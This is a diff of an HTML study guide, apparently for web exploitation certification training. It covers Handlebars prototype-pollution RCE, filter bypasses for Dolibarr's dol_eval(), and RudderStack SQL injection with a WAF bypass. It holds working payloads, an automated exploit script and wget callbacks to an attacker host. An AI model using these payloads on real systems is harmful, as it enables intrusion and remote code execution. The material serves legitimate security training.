+<p>The <code>appendContent</code> function in <code>javascript-compiler.js</code> prepends <code>this.pendingContent</code> to the current content. Polluting <code>pendingContent</code> injects visible text into the rendered template - confirming Handlebars without crashing the app. However, the content is escaped by <code>quotedString()</code>, so this cannot reach RCE.</p>
 
 <pre><code class="language-javascript">// compiler/javascript-compiler.js
 appendContent: function appendContent(content) {
@@ -6824,7 +6853,7 @@ appendContent: function appendContent(content) {
 &gt; {}.__proto__.pendingContent = "haxhaxhax";
 &gt; precompiled = Handlebars.precompile(ast);
 // return "haxhaxhaxhello " + ...
-// Content appears but is escaped — no RCE via this path</code></pre>
+// Content appears but is escaped - no RCE via this path</code></pre>
 
 <pre><code class="language-json">// HTTP payload to detect Handlebars (injects visible text)
 {
@@ -6845,14 +6874,14 @@ appendContent: function appendContent(content) {
 }</code></pre>
 
 <h4 id="oswe-prototype-pollution-hbs-numberliteral">12.8.3 NumberLiteral Injection (Unescaped Path)</h4>
-<p>The <code>NumberLiteral</code> compiler function calls <code>pushLiteral</code>, which calls <code>pushStackLiteral</code>, which calls <code>push</code> — none of which escape the value. By injecting a <code>NumberLiteral</code> node with arbitrary JavaScript as its <code>value</code>, the code is inserted directly into the compiled template function.</p>
+<p>The <code>NumberLiteral</code> compiler function calls <code>pushLiteral</code>, which calls <code>pushStackLiteral</code>, which calls <code>push</code> - none of which escape the value. By injecting a <code>NumberLiteral</code> node with arbitrary JavaScript as its <code>value</code>, the code is inserted directly into the compiled template function.</p>
 
-<pre><code class="language-javascript">// compiler/compiler.js — NumberLiteral uses pushLiteral
+<pre><code class="language-javascript">// compiler/compiler.js - NumberLiteral uses pushLiteral
 NumberLiteral: function NumberLiteral(number) {
     this.opcode('pushLiteral', number.value);
 },
 
-// compiler/javascript-compiler.js — pushLiteral does NOT escape
+// compiler/javascript-compiler.js - pushLiteral does NOT escape
 pushLiteral: function pushLiteral(value) {
     this.pushStackLiteral(value);   // no quotedString(), no escaping
 },
@@ -6872,13 +6901,13 @@ pushString: function pushString(string) {
 <pre><code class="language-javascript">// Step-by-step build of the RCE AST in the CLI
 &gt; {}.__proto__.type = "Program";
 
-// First attempt — need a body array
+// First attempt - need a body array
 &gt; Handlebars.parse("hello {{ foo }}");
 // TypeError: Cannot read property 'length' of undefined
 
 &gt; {}.__proto__.body = [];
 &gt; Handlebars.precompile("hello {{ foo }}");
-// '... return ""; ...'  — empty function, no error
+// '... return ""; ...'  - empty function, no error
 
 // Add MustacheStatement with path and loc
 &gt; {}.__proto__.body = [{ type: 'MustacheStatement', path: 0, loc: 0 }];
@@ -6937,7 +6966,7 @@ pushString: function pushString(string) {
   }
 }</code></pre>
 
-<p>After sending: (1) POST to <code>/tokens</code>, (2) send token to <code>/guaclite</code> to trigger the merge, (3) load any page — the Handlebars compiler uses the polluted AST instead of parsing the template, executing the RCE payload during compilation.</p>
+<p>After sending: (1) POST to <code>/tokens</code>, (2) send token to <code>/guaclite</code> to trigger the merge, (3) load any page - the Handlebars compiler uses the polluted AST instead of parsing the template, executing the RCE payload during compilation.</p>
 
 <pre><code class="language-bash"># docker-compose log confirms execution
 chips_1     | root
@@ -6948,8 +6977,8 @@ chips_1     | Error: /usr/src/app/views/hbs/error.hbs: Missing helper: "undefine
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
-<li><label><input type="checkbox"> Confirm Handlebars is active by polluting <code>pendingContent</code> — injected text appears on the rendered page</label></li>
-<li><label><input type="checkbox"> Read the Handlebars compiler source and identify <code>parseWithoutProcessing</code> — it skips parsing when <code>input.type === "Program"</code></label>
+<li><label><input type="checkbox"> Confirm Handlebars is active by polluting <code>pendingContent</code> - injected text appears on the rendered page</label></li>
+<li><label><input type="checkbox"> Read the Handlebars compiler source and identify <code>parseWithoutProcessing</code> - it skips parsing when <code>input.type === "Program"</code></label>
 <pre><code class="language-bash">grep -n "parseWithoutProcessing\|input.type" node_modules/handlebars/dist/cjs/handlebars/compiler/base.js</code></pre></li>
 <li><label><input type="checkbox"> Trace the compilation pipeline to find unescaped value injection: <code>NumberLiteral</code> → <code>pushLiteral</code> → <code>pushStackLiteral</code> → <code>push</code></label>
 <pre><code class="language-bash">grep -n "pushLiteral\|pushString\|quotedString\|NumberLiteral" node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js</code></pre></li>
@@ -6964,6 +6993,7 @@ Handlebars.precompile("test");</code></pre></li>
 
 <h3 id="oswe-prototype-pollution-exploit-script">12.9 Automated Exploit</h3>
 <p>The full chain can be scripted: POST the polluted JSON to <code>/tokens</code>, trigger the merge via WebSocket to <code>/guaclite</code>, then hit any page to fire the RCE.</p>
+<figure><img src="./img/oswe/fig306-handlebars-rce-exploit-via-prototype-pollution.png" alt="Handlebars RCE exploit via Prototype Pollution"></figure>
 
 <pre><code class="language-python">import requests
 import json
@@ -7082,19 +7112,24 @@ npm audit</code></pre>
 
 <h3 id="oswe-dolibarr-overview">13.1 Overview</h3>
 <p>Dolibarr is an open-source PHP ERP/CRM application that wraps <code>eval()</code> in a custom <code>dol_eval()</code> function with blocklist-based validation. The filter can be bypassed using PHP's dynamic function invocation, reflection, and encoding techniques to reach RCE. The attack requires administrative access.</p>
+<figure><img src="./img/oswe/fig308-accessing-codeserver.png" alt="Accessing code-server"></figure>
+<figure><img src="./img/oswe/fig309-accessing-the-files-in-usrsharedolibarr-with-codeserver.png" alt="Accessing the files in /usr/share/dolibarr with code-server"></figure>
 
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Identify the application framework, language, and version from the target VM</label>
 <pre><code class="language-bash">cat /usr/share/dolibarr/htdocs/filefunc.inc.php | grep -i version</code></pre></li>
+<figure><img src="./img/oswe/fig310-dolibarr-login-page.png" alt="Dolibarr login page"></figure>
+<figure><img src="./img/oswe/fig311-starting-the-debugger.png" alt="Starting the Debugger"></figure>
 <li><label><input type="checkbox"> Access the source code via code-server at <code>http://[target-ip]:8000</code></label></li>
 <li><label><input type="checkbox"> Enable PHP step debugging in VS Code by launching the Xdebug configuration</label></li>
 <li><label><input type="checkbox"> Browse the application through Burp Suite and map functionality available to authenticated and unauthenticated users</label></li>
 </ul>
 
 <h3 id="oswe-dolibarr-dangerous-functions">13.2 Dangerous Functions</h3>
-<p>Start source code review by searching for dangerous sinks — functions that execute code, run OS commands, or manipulate memory. If user input reaches any of these unsanitized, the result is typically RCE.</p>
+<p>Start source code review by searching for dangerous sinks - functions that execute code, run OS commands, or manipulate memory. If user input reaches any of these unsanitized, the result is typically RCE.</p>
+<figure><img src="./img/oswe/fig315-accessing-the-dolibarr-source-code-in-codeserver.png" alt="Accessing the Dolibarr source code in code-server"></figure>
 
 <table class="custom-table">
 <thead><tr><th>Language</th><th>Function</th><th>Risk</th></tr></thead>
@@ -7189,6 +7224,7 @@ if ($returnvalue) {
 
 <h3 id="oswe-dolibarr-filter-analysis">13.4 Filter Analysis</h3>
 <p>The <code>dol_eval()</code> function applies three layers of validation before passing the string to <code>eval()</code>. Each layer must be defeated to reach code execution.</p>
+<figure><img src="./img/oswe/fig319-searching-for-doleval-calls-with-an-empty-string-parameter.png" alt="Searching for dol_eval() calls with an empty string parameter"></figure>
 
 <h4 id="oswe-dolibarr-filter-layer1">13.4.1 Layer 1: Character Allowlist</h4>
 <p>When <code>$onlysimplestring</code> equals <code>'1'</code>, the function uses a regex to restrict allowed characters. If set to <code>'2'</code>, square brackets are additionally permitted. Any other value (including an empty string) skips the character check entirely, since the code only handles <code>'1'</code> and <code>'2'</code> with no fallback guard clause.</p>
@@ -7251,7 +7287,7 @@ if (preg_match('/[^0-9]+\.[^0-9]+/', $s)) {
 </table>
 
 <h4 id="oswe-dolibarr-filter-layer3">13.4.3 Layer 3: Function Blocklist</h4>
-<p>The final layer defines arrays of forbidden strings and function names. A do-while loop replaces matches with <code>__forbiddenstring__</code> — if that sentinel appears after replacement, the function bails before calling <code>eval()</code>. The blocklist covers <code>base64_decode</code> but misses <code>urldecode</code>, <code>str_rot13</code>, and other encoding functions.</p>
+<p>The final layer defines arrays of forbidden strings and function names. A do-while loop replaces matches with <code>__forbiddenstring__</code> - if that sentinel appears after replacement, the function bails before calling <code>eval()</code>. The blocklist covers <code>base64_decode</code> but misses <code>urldecode</code>, <code>str_rot13</code>, and other encoding functions.</p>
 
 <pre><code class="language-php">// Layer 3: Function blocklist (lines 9023-9038)
 
@@ -7305,7 +7341,7 @@ do {
 </ul>
 
 <h3 id="oswe-dolibarr-bypass">13.5 Filter Bypass Techniques</h3>
-<p>Blocklist-based filtering around <code>eval()</code> is a losing game — PHP has too many ways to invoke functions indirectly. The goal is to call blocked functions without their names appearing in plaintext.</p>
+<p>Blocklist-based filtering around <code>eval()</code> is a losing game - PHP has too many ways to invoke functions indirectly. The goal is to call blocked functions without their names appearing in plaintext.</p>
 
 <h4 id="oswe-dolibarr-bypass-getfunctions">13.5.1 Dynamic Function Invocation via get_defined_functions()</h4>
 <p><code>get_defined_functions()</code> returns a multidimensional array of every defined function. Calling a function by its array index avoids name-based blocklist detection entirely. <code>exec()</code> sits in the "internal" array.</p>
@@ -7341,7 +7377,7 @@ php &gt; echo get_defined_functions()["internal"][4]("hello world");
 php &gt; echo get_defined_functions()["internal"][550]("whoami");
 student</code></pre>
 
-<p>The index of <code>exec()</code> shifts when Dolibarr imports additional functions at runtime. Use <code>array_search()</code> with a URL-encoded function name to find it dynamically — <code>urldecode()</code> is not on the blocklist.</p>
+<p>The index of <code>exec()</code> shifts when Dolibarr imports additional functions at runtime. Use <code>array_search()</code> with a URL-encoded function name to find it dynamically - <code>urldecode()</code> is not on the blocklist.</p>
 
 <pre><code class="language-php">// Verify urldecode handles alphanumeric encoding
 php &gt; echo urldecode("%65%78%65%63");
@@ -7361,7 +7397,7 @@ student</code></pre>
 <p>This payload requires square brackets and percent signs, which are blocked when <code>$onlysimplestring</code> is <code>'1'</code>. A call to <code>dol_eval()</code> with <code>$onlysimplestring</code> set to an empty string or <code>'0'</code> is required for this payload to work.</p>
 
 <h4 id="oswe-dolibarr-bypass-reflection">13.5.2 Reflection-Based Bypass</h4>
-<p>A <code>ReflectionFunction</code> object can invoke any function by name. Pass the URL-encoded name of <code>exec()</code> to dodge the blocklist — no <code>get_defined_functions</code> or <code>array_search</code> needed.</p>
+<p>A <code>ReflectionFunction</code> object can invoke any function by name. Pass the URL-encoded name of <code>exec()</code> to dodge the blocklist - no <code>get_defined_functions</code> or <code>array_search</code> needed.</p>
 
 <pre><code class="language-php">// ReflectionFunction bypass with urldecode
 (new ReflectionFunction(urldecode('%65%78%65%63')))-&gt;invoke('whoami');</code></pre>
@@ -7543,6 +7579,7 @@ docker exec -it student_caddy_1 /bin/sh</code></pre></li>
 
 <h3 id="oswe-rudderstack-endpoint-discovery">14.3 API Endpoint Discovery</h3>
 <p>RudderStack uses <code>gorilla/mux</code> for HTTP routing. The <code>StartWebHandler()</code> function in <code>gateway.go</code> registers all API endpoints using <code>HandleFunc()</code> calls that map URL paths to handler functions. Searching for <code>/v1</code> in <code>*.go</code> files (excluding test files) reveals the available endpoints.</p>
+<figure><img src="./img/oswe/fig336-intruder-setup-for-payload-set-one.png" alt="Intruder setup for payload set one"></figure>
 
 <pre><code class="language-javascript">// StartWebHandler() in gateway.go - route registration (lines 1422-1434)
 func (gateway *HandleT) StartWebHandler(ctx context.Context) error {
@@ -7602,6 +7639,7 @@ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2 |
 <p>Use Burp Suite Intruder with a Cluster bomb attack to test all combinations of HTTP methods (GET, POST) and URL paths. Configure two payload positions: the HTTP method and the URL path. Uncheck "URL-encode these characters" for the URL payload set to preserve forward slashes.</p>
 
 <p>Sorting results by status code reveals an HTTP 400 response for POST to <code>/v1/warehouse/pending-events?triggerUpload=true</code> with the body "can't unmarshall body." Sorting by response length identifies six endpoints returning the same error, indicating they accept POST requests without authentication. Most other endpoints return 404 or "Failed to read writeKey" (authentication required).</p>
+<figure><img src="./img/oswe/fig340-response-in-repeater-with-empty-source-id.png" alt="Response in Repeater with “empty source id”"></figure>
 
 <table class="custom-table">
 <thead><tr><th>Endpoint</th><th>Auth Required</th><th>Response</th></tr></thead>
@@ -7630,6 +7668,7 @@ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2 |
 
 <h3 id="oswe-rudderstack-sqli-discovery">14.4 SQL Injection Discovery</h3>
 <p>The <code>/v1/warehouse/pending-events</code> handler expects a JSON body with <code>source_id</code> and <code>task_run_id</code> fields. Adding <code>Content-Type: application/json</code> and a valid JSON body produces an HTTP 200 response, confirming unauthenticated access.</p>
+<figure><img src="./img/oswe/fig342-repeater-with-200-ok-response.png" alt="Repeater with 200 OK response"></figure>
 
 <h4 id="oswe-rudderstack-sqli-request-format">14.4.1 Request Format</h4>
 <p>The <code>PendingEventsRequestT</code> struct in <code>warehouse/utils/utils.go</code> defines the expected JSON structure. The <code>pendingEventsHandler()</code> function in <code>warehouse.go</code> unmarshals the request body and extracts the <code>source_id</code> value.</p>
@@ -7655,7 +7694,7 @@ if sourceID == "" {
 }</code></pre>
 
 <h4 id="oswe-rudderstack-sqli-vulnerable-function">14.4.2 Vulnerable SQL Construction</h4>
-<p>The <code>sourceID</code> value passes into <code>getPendingStagingFileCount()</code>, which builds its SQL query with <code>fmt.Sprintf()</code> instead of parameterized queries. The user-controlled <code>sourceOrDestId</code> lands directly in the WHERE clause — classic string-formatted SQL injection.</p>
+<p>The <code>sourceID</code> value passes into <code>getPendingStagingFileCount()</code>, which builds its SQL query with <code>fmt.Sprintf()</code> instead of parameterized queries. The user-controlled <code>sourceOrDestId</code> lands directly in the WHERE clause - classic string-formatted SQL injection.</p>
 
 <pre><code class="language-javascript">// getPendingStagingFileCount() - vulnerable SQL (warehouse.go lines 1777-1798)
 func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCount int64, err error) {
@@ -7746,7 +7785,7 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
 [attacker-ip] - - [29/Feb/2024 15:26:01] code 404, message File not found
 [attacker-ip] - - [29/Feb/2024 15:26:01] "GET /it_worked HTTP/1.1" 404 -</code></pre>
 
-<p>The HTTP 500 from the application is expected — <code>wget</code> returns a non-zero exit code since the file doesn't exist on the attacker server. The callback on the attacker's HTTP server confirms OS command execution on the target.</p>
+<p>The HTTP 500 from the application is expected - <code>wget</code> returns a non-zero exit code since the file doesn't exist on the attacker server. The callback on the attacker's HTTP server confirms OS command execution on the target.</p>
 
 
 <h4>Methodology</h4>
@@ -7834,7 +7873,7 @@ SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAME
 </table>
 
 <h4 id="oswe-rudderstack-waf-regex">14.6.5 Understanding the WAF Regex</h4>
-<p>The regex <code>^(?:[^']*'|[^"]*"|[^`]*`)[\s\v]*;</code> matches a closing quote (single, double, or backtick) followed by optional whitespace and a semicolon — the classic stacked-query injection signature. The <code>urlDecodeUni</code> and <code>replaceComments</code> transformations run before matching, blocking basic URL-encoding and SQL comment evasion.</p>
+<p>The regex <code>^(?:[^']*'|[^"]*"|[^`]*`)[\s\v]*;</code> matches a closing quote (single, double, or backtick) followed by optional whitespace and a semicolon - the classic stacked-query injection signature. The <code>urlDecodeUni</code> and <code>replaceComments</code> transformations run before matching, blocking basic URL-encoding and SQL comment evasion.</p>
 
 <h4 id="oswe-rudderstack-waf-bypass-technique">14.6.6 Crafting the Bypass</h4>
 <p>The bypass separates the single quote from the semicolon by inserting a valid SQL expression between them. Adding <code>or 1=2</code> after the closing quote and before the semicolon prevents the regex from matching, because the quote is no longer immediately followed by whitespace and a semicolon. The injected expression must be valid SQL to avoid syntax errors.</p>
@@ -7868,7 +7907,7 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
 [attacker-ip] - - [29/Feb/2024 15:44:44] code 404, message File not found
 [attacker-ip] - - [29/Feb/2024 15:44:44] "GET /it_will_bypass HTTP/1.1" 404 -</code></pre>
 
-<p>No WAF block, and the callback landed — the modified payload evades rule 942540 while still executing through the SQL injection.</p>
+<p>No WAF block, and the callback landed - the modified payload evades rule 942540 while still executing through the SQL injection.</p>
 
 <h4 id="oswe-rudderstack-methodology">Methodology</h4>
 <ul class="methodology-checklist">
@@ -7899,6 +7938,7 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
   <li><label><input type="checkbox" data-id="oswe-14-10"> Modify the payload to evade the WAF by separating the quote from the semicolon with a valid SQL expression</label></li>
   <li><label><input type="checkbox" data-id="oswe-14-11"> Verify callback on attacker HTTP server to confirm WAF bypass and RCE</label></li>
 </ul>
+</div>
 
         </div>
       </div>
@@ -7909,23 +7949,80 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
   <div id="index" class="index">
 <button class="dropdown-btn section-flow-1">1. Tools and Methodologies<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-1">
-<a class="dropdown-link" href="#oswe-tools-web-traffic">1.1 Web Traffic Inspection</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.1 Web Traffic Inspection<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-tools-burp-proxy">1.1.1 Burp Suite Proxy</a>
+<a href="#oswe-tools-burp-browsers">1.1.2 Using Burp with Other Browsers</a>
+<a href="#oswe-tools-burp-scope">1.1.3 Scope and Filtering</a>
+<a href="#oswe-tools-burp-repeater">1.1.4 Repeater and Comparer</a>
+<a href="#oswe-tools-burp-decoder">1.1.5 Decoder</a>
+</div>
+</div>
 <a class="dropdown-link" href="#oswe-tools-python">1.2 Interacting with Web Listeners using Python</a>
-<a class="dropdown-link" href="#oswe-tools-source-recovery">1.3 Source Code Recovery</a>
-<a class="dropdown-link" href="#oswe-tools-analysis">1.4 Source Code Analysis Methodology</a>
-<a class="dropdown-link" href="#oswe-tools-debugging">1.5 Debugging</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.3 Source Code Recovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-tools-dotnet-decompilation">1.3.1 .NET Decompilation with dnSpy</a>
+<a href="#oswe-tools-java-decompilation">1.3.2 Java Decompilation with JD-GUI</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.4 Source Code Analysis Methodology<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-tools-analysis-approach">1.4.1 Approach to Analysis</a>
+<a href="#oswe-tools-ide">1.4.2 Using an IDE</a>
+<a href="#oswe-tools-routing">1.4.3 Common HTTP Routing Patterns</a>
+<a href="#oswe-tools-vuln-patterns">1.4.4 Vulnerability Patterns to Search For</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">1.5 Debugging<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-tools-debugging-local">1.5.1 Local Debugging with VS Code</a>
+<a href="#oswe-tools-debugging-java">1.5.2 Java Remote Debugging</a>
+<a href="#oswe-tools-debugging-dotnet">1.5.3 .NET Debugging with dnSpy</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-2">2. ATutor Authentication Bypass and RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-2">
 <a class="dropdown-link" href="#oswe-atutor-setup">2.1 Getting Started</a>
 <a class="dropdown-link" href="#oswe-atutor-discovery">2.2 Initial Vulnerability Discovery</a>
 <a class="dropdown-link" href="#oswe-atutor-blind-sqli">2.3 Blind SQL Injection Techniques</a>
-<a class="dropdown-link" href="#oswe-atutor-deeper">2.4 Digging Deeper</a>
-<a class="dropdown-link" href="#oswe-atutor-exfiltration">2.5 Data Exfiltration</a>
-<a class="dropdown-link" href="#oswe-atutor-auth-subvert">2.6 Subverting ATutor Authentication</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">2.4 Digging Deeper<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-atutor-addslashes">2.4.1 When addslashes() Falls Short</a>
+<a href="#oswe-atutor-parameterization">2.4.2 Improper Use of Parameterization</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">2.5 Data Exfiltration<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-atutor-html-compare">2.5.1 Comparing HTML Responses</a>
+<a href="#oswe-atutor-version-extract">2.5.2 MySQL Version Extraction</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">2.6 Subverting ATutor Authentication<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-atutor-cred-extract">2.6.1 Credential Extraction</a>
+<a href="#oswe-atutor-hash-cracking">2.6.2 Password Hash Cracking</a>
+</div>
+</div>
 <a class="dropdown-link" href="#oswe-atutor-auth-bad">2.7 Authentication Gone Bad</a>
 <a class="dropdown-link" href="#oswe-atutor-upload">2.8 Bypassing File Upload Restrictions</a>
-<a class="dropdown-link" href="#oswe-atutor-rce-exploit">2.9 Gaining Remote Code Execution</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">2.9 Gaining Remote Code Execution<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-atutor-webroot">2.9.1 Disclosing the Web Root</a>
+<a href="#oswe-atutor-writable">2.9.2 Finding Writable Directories</a>
+<a href="#oswe-atutor-extension-bypass">2.9.3 Bypassing the File Extension Filter</a>
+<a href="#oswe-atutor-revshell">2.9.4 Full Reverse Shell</a>
+<a href="#oswe-atutor-full-exploit">2.9.5 Automated Exploit Script</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-3">3. ATutor LMS Type Juggling<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-3">
@@ -7933,104 +8030,473 @@ Serving HTTP on 0.0.0.0 port [http-port] (http://0.0.0.0:[http-port]/) ...
 <a class="dropdown-link" href="#oswe-typejuggling-comparisons">3.2 PHP Loose and Strict Comparisons</a>
 <a class="dropdown-link" href="#oswe-typejuggling-conversion">3.3 PHP String Conversion to Numbers</a>
 <a class="dropdown-link" href="#oswe-typejuggling-vuln-discovery">3.4 Vulnerability Discovery</a>
-<a class="dropdown-link" href="#oswe-typejuggling-attack">3.5 Attacking the Loose Comparison</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">3.5 Attacking the Loose Comparison<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-typejuggling-magic-hashes">3.5.1 Magic Hashes</a>
+<a href="#oswe-typejuggling-magic-email">3.5.2 Exploiting the Magic Email</a>
+<a href="#oswe-typejuggling-remediation">3.5.3 Remediation</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-4">4. ManageEngine SQL Injection RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-4">
 <a class="dropdown-link" href="#oswe-manageengine-overview">4.1 Vulnerability Overview</a>
-<a class="dropdown-link" href="#oswe-manageengine-discovery">4.2 Vulnerability Discovery</a>
-<a class="dropdown-link" href="#oswe-manageengine-trigger">4.3 Triggering the Vulnerability</a>
-<a class="dropdown-link" href="#oswe-manageengine-bypass">4.4 Bypassing Character Restrictions</a>
-<a class="dropdown-link" href="#oswe-manageengine-exploitation">4.5 Exploitation</a>
-<a class="dropdown-link" href="#oswe-manageengine-extensions">4.6 PostgreSQL Extensions</a>
-<a class="dropdown-link" href="#oswe-manageengine-largeobjects">4.7 Large Objects for File Transfer</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.2 Vulnerability Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-servlets">4.2.1 Servlet Mappings</a>
+<a href="#oswe-manageengine-source">4.2.2 Source Code Recovery</a>
+<a href="#oswe-manageengine-code-analysis">4.2.3 Code Analysis</a>
+<a href="#oswe-manageengine-db-logging">4.2.4 Enabling Database Logging</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.3 Triggering the Vulnerability<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-poc">4.3.1 Proof of Concept Script</a>
+<a href="#oswe-manageengine-techniques">4.3.2 Injection Technique Comparison</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.4 Bypassing Character Restrictions<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-encoding">4.4.1 HTML Encoding Problem</a>
+<a href="#oswe-manageengine-chr">4.4.2 Using CHR() and String Concatenation</a>
+<a href="#oswe-manageengine-dollar-quotes">4.4.3 Dollar-Quoted String Constants</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.5 Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-dba">4.5.1 Checking DBA Privileges</a>
+<a href="#oswe-manageengine-filesystem">4.5.2 Accessing the File System</a>
+<a href="#oswe-manageengine-rce-copyto">4.5.3 Reverse Shell via COPY TO</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.6 PostgreSQL Extensions<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-udf">4.6.1 Building a Custom UDF</a>
+<a href="#oswe-manageengine-remote-udf">4.6.2 Loading UDF from Remote Share</a>
+<a href="#oswe-manageengine-udf-revshell">4.6.3 UDF Reverse Shell</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">4.7 Large Objects for File Transfer<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-manageengine-lo-mechanics">4.7.1 Large Object Mechanics</a>
+<a href="#oswe-manageengine-lo-revshell">4.7.2 Large Object Reverse Shell</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-5">5. Bassmaster NodeJS Arbitrary JavaScript Injection<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-5">
-<a class="dropdown-link" href="#oswe-bassmaster-overview">Overview</a>
-<a class="dropdown-link" href="#oswe-bassmaster-hapijs">Hapi.js Framework and Plugin Architecture</a>
-<a class="dropdown-link" href="#oswe-bassmaster-batch-protocol">Batch Request Protocol</a>
-<a class="dropdown-link" href="#oswe-bassmaster-vuln-discovery">Vulnerability Discovery</a>
-<a class="dropdown-link" href="#oswe-bassmaster-triggering">Triggering the Vulnerability</a>
-<a class="dropdown-link" href="#oswe-bassmaster-reverse-shell">Obtaining a Reverse Shell</a>
+<a class="dropdown-link" href="#oswe-bassmaster-overview">5.1 Overview</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">5.2 Hapi.js Framework and Plugin Architecture<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-bassmaster-routes">5.2.1 Route Configuration</a>
+<a href="#oswe-bassmaster-plugin-reg">5.2.2 Plugin Registration</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">5.3 Batch Request Protocol<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-bassmaster-references">5.3.1 Inter-Request References</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">5.4 Vulnerability Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-bassmaster-safe-alternative">5.4.1 Safe Alternative</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">5.5 Triggering the Vulnerability<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-bassmaster-poc">5.5.1 Proof of Concept</a>
+<a href="#oswe-bassmaster-cmd-exec">5.5.2 Command Execution</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">5.6 Obtaining a Reverse Shell<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-bassmaster-python-exploit">5.6.1 Automated Python Exploit</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-6">6. DotNetNuke Cookie Deserialization RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-6">
-<a class="dropdown-link" href="#oswe-dnn-overview">6.1 Serialization Basics</a>
-<a class="dropdown-link" href="#oswe-dnn-vuln-analysis">6.2 DotNetNuke Vulnerability Analysis</a>
-<a class="dropdown-link" href="#oswe-dnn-payload">6.3 Payload Construction</a>
-<a class="dropdown-link" href="#oswe-dnn-exploit">6.4 Full Exploit</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">6.1 Serialization Basics<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dnn-xmlserializer-limits">6.1.1 XmlSerializer Limitations</a>
+<a href="#oswe-dnn-xmlserializer">6.1.2 Basic XmlSerializer Example</a>
+<a href="#oswe-dnn-expanded-xml">6.1.3 Expanded XmlSerializer (Dynamic Type Resolution)</a>
+<a href="#oswe-dnn-type-confusion">6.1.4 Type Confusion for Code Execution</a>
+</div>
+</div>
+<div class="nested-dropdown">
